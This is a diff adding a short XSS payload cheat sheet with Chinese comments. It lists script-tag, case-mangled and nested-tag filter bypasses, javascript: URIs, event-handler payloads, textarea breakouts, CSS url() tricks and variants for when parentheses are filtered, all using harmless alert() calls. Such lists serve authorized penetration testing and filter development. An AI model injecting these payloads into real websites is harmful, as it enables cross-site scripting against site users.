@@ -1,0 +1,31 @@
+<script>alert(1);</script>
+"><script>alert(1);</script><"
+'><script>alert(1);</script><'
+<scrscriptipt>alert(1);</scrscriptipt>
+<scr<script>ipt>alert(1);</scr<script>ipt>
+<SCRIPT>alert(1);</SCRIPT>
+<sCriPt>alert(1);</scrIpT>
+<img src="javascript:alert(1);">
+
+//使用空格
+<img src="javas  cript:alert(1);">
+
+//使用Tab键
+<img src="javas
+cript:alert(1);">
+
+<img src=# onclick=alert(1)>
+<img src=# onerror=alert(1)>
+<a href="javascript:alert(1)">XSS</a>
+
+<meta http-equiv="refresh" content="0">//网页不停的刷新
+
+//textarea两边要闭合
+</textarea><script>alert(1);</script><textarea>
+
+background-color:url(javascript:alert(document.domain);)
+background-image:url(javascript:alert(document.domain);)
+
+//当（）被过滤
+<script>alert`1`</script>
+<svg><script>alert&#40;1&#41;</script>
